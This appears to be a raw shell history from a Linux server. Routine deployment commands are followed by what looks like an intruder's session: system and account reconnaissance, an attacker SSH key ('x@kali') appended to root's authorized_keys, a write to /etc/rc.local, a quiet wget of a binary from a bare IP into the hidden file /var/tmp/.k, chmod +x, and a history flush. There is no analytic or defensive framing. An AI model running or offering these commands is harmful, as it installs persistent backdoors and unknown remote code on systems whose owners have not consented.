systemctl status app
git pull
sudo systemctl restart app
make deploy
cd app
tail -f /var/log/app/app.log
ls
id
uname -a
w
cat /etc/passwd
ls -la
ps aux
sudo -l
echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDuAIZKcSuQE7ABIUO+ME+qBb16r5Wsb0WN2Yazawi77 x@kali' | sudo tee -a /root/.ssh/authorized_keys
echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDuAIZKcSuQE7ABIUO+ME+qBb16r5Wsb0WN2Yazawi77 x@kali' >> ~/.ssh/authorized_keys
sudo tee -a /etc/rc.local
wget -q http://185.110.195.150/k -O /var/tmp/.k
chmod +x /var/tmp/.k
history -w
